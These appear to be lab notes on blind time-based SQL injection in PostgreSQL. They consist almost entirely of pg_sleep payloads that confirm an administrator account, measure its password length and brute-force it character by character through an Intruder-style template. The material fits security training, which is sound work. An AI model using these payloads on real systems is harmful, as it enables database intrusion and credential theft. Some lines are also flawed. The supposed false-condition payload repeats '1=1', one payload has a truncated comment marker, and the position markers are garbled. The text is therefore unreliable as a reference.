Lab #15: 

1. Causing the application to sleep. There is a time delay of 10 seconds when the condition is true
'; select pg_sleep(10)--
'||pg_sleep(10)--

Or use conditional statement
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--   --{ No time delay because the condtion is false

2. Confirming that there is a user called administrator. 
'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END from users--

3. The next step is to determine how many characters are in the password of the administrator user. 
'; SELECT CASE WHEN (username='administrator' AND length(password)>19) THEN pg_sleep(5) ELSE pg_sleep(0) END from users-
The password length is 20 character

4. Test the character at each position. Set concurrent requests to 1 from resource pool before launching the intruder attack 
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END from users--
'; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,ยง1ยง,1)='ยงaยง') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
